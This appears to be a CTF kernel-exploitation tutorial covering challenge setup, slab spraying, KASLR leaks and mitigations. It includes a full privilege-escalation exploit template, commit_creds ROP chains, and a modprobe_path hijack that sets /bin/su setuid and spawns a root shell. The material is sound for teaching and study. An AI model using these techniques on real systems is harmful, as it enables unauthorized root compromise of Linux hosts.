# Kernel Pwn

## Environment Setup

A typical kernel challenge package:

```text
kernel/
├── bzImage          # compressed kernel image
├── vmlinux          # uncompressed kernel (with symbols, for gdb)
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # vulnerable driver
├── run.sh           # qemu launch script
└── (.config)        # build config, optional
```

### Unpacking initramfs and Modifying the init Script

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# or newc format:
# cpio -idm < ../initramfs.cpio

# modify init to get root (for CTF learning; real challenges usually setuid 1000)
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# or comment out the user-switching line

# repack
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### Extracting vmlinux (if Only bzImage Is Provided)

```bash
# use the extract-vmlinux script (kernel source scripts/)
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU Launch Parameter Template

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # enable gdb port 1234
```

Protections corresponding to key parameters:

| Parameter | Meaning | Impact on Exploitation |
|------|------|---------|
| `+smep` | kernel mode cannot execute user-mode code | must use ROP; cannot jump to user-mode shellcode |
| `+smap` | kernel mode cannot access user-mode data | the ROP chain cannot be placed in user mode; it must be placed in kernel mode (heap spray / msgsnd) |
| `+pku` | Protection Keys | similar to SMAP |
| `nokaslr` | disables KASLR | function addresses are fixed |
| `kaslr` | enables KASLR | must leak |
| `pti=on` | KPTI (Meltdown fix) | returning to user mode requires swapgs_restore_regs_and_return_to_usermode |

### Debugging

```bash
# terminal 1
./run.sh   # with -s

# terminal 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

For GEF, the fork maintained by bata24 is recommended; it has dedicated pretty-printers for kernel structures.

## Vulnerability Type Triage

| Vulnerability | Typical Source | Exploitation Baseline |
|------|---------|---------|
| kernel stack overflow | copy_from_user with controllable length | stack canary + KASLR → ROP |
| kernel heap overflow | out-of-bounds write in kmalloc slab | slab spray + overwrite adjacent object |
| UAF | refcount bug / double free | reallocate the same slab → control the freed object |
| integer overflow | overflow in size calculation → small allocation, large copy | effectively an overflow, same as above |
| TOCTOU | second dereference of a user-mode pointer | userfaultfd / FUSE to stall |
| race | two threads calling ioctl simultaneously | win the timing window |
| arbitrary read/write | already the ultimate primitive | directly modify cred / modprobe_path |

## slab Spraying (the Core of Heap Pwn)

Spray kernel objects of a controllable size into the vulnerable slab to overwrite the target object.

| slab size | Spray Object | Advantage |
|-----------|------|------|
| kmalloc-64 / 96 | `seq_operations` | has function pointers; overwriting it gives IP control |
| kmalloc-1024 | `tty_struct` | has ops pointers; a well-crafted structure |
| kmalloc-4096 | `pipe_buffer` | the modern mainstay; still effective on 6.x |
| any size | `msg_msg` | size controllable (8 - 4096+); sysv msgsnd controls the data |
| kmalloc-128 | `user_key_payload` | keyctl family of interfaces |

### msg_msg Spray Example

```c
// trigger from user mode
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // plus the 0x30 msg_msg header = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // spray into kmalloc-128
// ... trigger the vulnerability to overwrite
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // read it back to check whether it was modified → leak
```

## Privilege Escalation Paths

### 1. commit_creds(prepare_kernel_cred(0)) ROP

Classic and general-purpose. Prerequisite: ability to control RIP (stack overflow / vtable hijack).

```c
// user-mode ROP chain
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // returns root cred in rax
    pop_rdi,                          // pop rdi; ret
    /* placeholder, overwritten by the mov below */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // move rax→rdi (some require a dedicated gadget)
    commit_creds,                     // set the current process cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // skip the push sequence
    0, 0,                             // rax, rdi placeholders
    user_rip,                         // user-mode return function (with cs/ss saved)
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**Key gadgets** (search vmlinux with ROPgadget):

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

Before returning to user mode, cs/ss/rflags/rsp must be saved:

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. modprobe_path → /tmp/x (the Easiest)

```text
Principle:
  - the kernel global variable modprobe_path defaults to "/sbin/modprobe"
  - when execve is called on a file with an unrecognized magic, the kernel executes modprobe_path as root
  - change it to "/tmp/x", write /tmp/x (chmod +x), and trigger execution via an unknown magic

Applies when: you have an arbitrary write primitive but cannot necessarily ROP
```

```c
// 1. prepare the payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. prepare the trigger file
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. vulnerability write: change modprobe_path to "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. trigger
system("/tmp/trigger");
// the kernel runs /tmp/x as root, which performed chmod +s /bin/su

// 5. exploit the setuid
system("/bin/su");
```

**Source of the modprobe_path address**: a symbol in vmlinux, or /proc/kallsyms (if kptr_restrict=0).

### 3. core_pattern hijack

```text
Similar idea: /proc/sys/kernel/core_pattern controls the coredump handler
Change it to "|/tmp/x %P" so it is invoked when a process crashes
Drawback: requires triggering a coredump; more cumbersome than modprobe_path
```

### 4. Disabling SMEP/SMAP via Kernel ROP

If you just want to jump back to user-mode shellcode (for learning purposes), you can ROP to clear bits in CR4:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// after disabling SMEP+SMAP, jumping to user-mode shellcode will only work then
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // desired CR4 value (with SMEP/SMAP bits cleared)
    mov_cr4_rdi,            // something like "mov cr4, rdi; pop rbp; ret"
    0,
    user_shellcode_addr,    // jump there (this step fails if SMEP has not been disabled yet)
};
```

In practice, **real-world exploits basically do not go this route** — going straight for a commit_creds ROP is shorter and more reliable.

## KASLR Leak Channels

| Source | Restriction | Notes |
|------|------|------|
| /proc/kallsyms | Real addresses only when `kptr_restrict=0` | Often enabled in CTFs |
| /sys/module/.../sections/.text | Same as above | Module base address |
| dmesg | Readable only when `dmesg_restrict=0` | oops information leaks addresses |
| Uninitialized kernel stack read | The vulnerability itself must allow arbitrary read | Residual addresses |
| msg_msg + vulnerability leak | OOB read after spraying | Generic |
| Side channel (Meltdown/Spectre) | KPTI mitigates Meltdown | Not generic |
| SIDT/SGDT user-mode instructions | Old kernels may leak | Mostly blocked in modern kernels |

```c
// Classic: read from /proc/kallsyms
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // See vmlinux for the offset
```

## Complete exploit template (user-mode + ioctl trigger + ROP privilege escalation + shell)

```c
// exploit.c — generic kernel pwn skeleton
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base (leak first, or hardcode directly when using nokaslr) ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. leak KASLR base (here we assume /proc/kallsyms is readable, or write your own leak primitive)
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. Build ROP (on the user stack or on a sprayed fake stack)
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // temporary user rsp; can point high in the mmap
    rop[i++] = user_ss;

    // 3. Trigger the vulnerability so the kernel RIP jumps to rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // Challenge-specific: ioctl / write / read

    return 0;
}
```

## Learning Reference: CVE-2022-0185

```text
Vulnerability: signed/unsigned confusion in the length calculation of legacy_parse_param in fs/fs_context.c
      → kmalloc heap buffer overflow, arbitrary size, arbitrary data

Why it is a good learning sample:
1. Does not require root to trigger (unprivileged user namespace)
2. Overflow size is completely controllable
3. Complete public writeup + PoC
4. Combines: user_ns exploitation, msg_msg spraying, reclamation after UAF, cross-cache exploitation

Learning path:
1. Build a kernel with CONFIG_USER_NS=y
2. Run the original Crusaders of Rust PoC: https://www.openwall.com/lists/oss-security/2022/01/18/7
3. Read the official willsroot.io writeup (the version included by PortSwigger)
4. Rewrite it manually: change msg_msg spraying to a pipe_buffer spraying version (practice different slab paths)
5. Add a KASLR leak (the original uses /proc/kallsyms; after it is disabled in the challenge version, switch to OOB read)
```

Main technical points mapped to sections in this document:

- Vulnerability type → "kernel heap overflow"
- Spray object → "msg_msg spraying"
- Privilege escalation method → "commit_creds ROP" or "modprobe_path"
- KASLR leak → "/proc/kallsyms" or "msg_msg + vulnerability leak"

## Notes

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** makes the kernel stack base randomly offset by 0-1023 on every syscall, affecting all exploits that rely on a fixed stack offset
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** randomizes object allocation within slabs, reducing spray success rate; spray more
- **CONFIG_STATIC_USERMODEHELPER** sets modprobe_path to the read-only `static_usermodehelper_path`, making modprobe attacks ineffective
- **KPTI** separates user-mode/kernel-mode page tables; returning to user mode must go through the `swapgs_restore_regs_and_return_to_usermode` trampoline and cannot directly use swapgs+iretq
- **FG-KASLR** (function-granular KASLR) randomizes at function granularity; multiple symbol leaks are needed to infer each function's offset
- **CET / IBT** (Intel Control-flow Enforcement) requires indirect jumps to land on ENDBR instructions, invalidating some gadgets
- **Do not call printk in the kernel for test output** — serial I/O changes timing and breaks races; use a magic register value (rcx=0xdeadbeef) + a gdb watch for debugging